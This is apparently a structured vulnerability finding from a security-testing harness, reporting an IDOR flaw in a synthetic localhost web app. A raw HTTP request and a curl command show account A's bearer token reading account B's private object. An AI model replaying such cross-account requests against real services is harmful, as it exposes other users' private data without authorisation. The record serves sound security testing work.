input.title: Cross-account object read
input.evidence: Account A's public bearer token reads account B's object. GET /objects/B with Authorization: Bearer token-a-public returned HTTP 200 and body {"object":"private-B"} (body_sha256 sha256:41eb350df0474bb0d52b7ab0ee2175284e01e7b626b080459856af57d87957d2). The synthetic SPA serves account B's private object ("private-B") without enforcing that the authenticated account owns the requested object id, an IDOR / broken object-level authorization.
input.poc:
HTTP request:
GET /objects/B HTTP/1.0
Host: 127.0.0.1:32779
Authorization: Bearer token-a-public
X-Request-ID: byopair01

Observed: HTTP/1.0 200 OK, Content-Type: application/json, body:
{"object":"private-B"}

i.e. account A (token-a-public) can retrieve account B's object. curl:
curl -s -H 'Authorization: Bearer token-a-public' http://127.0.0.1:32779/objects/B
# -> {"object":"private-B"}
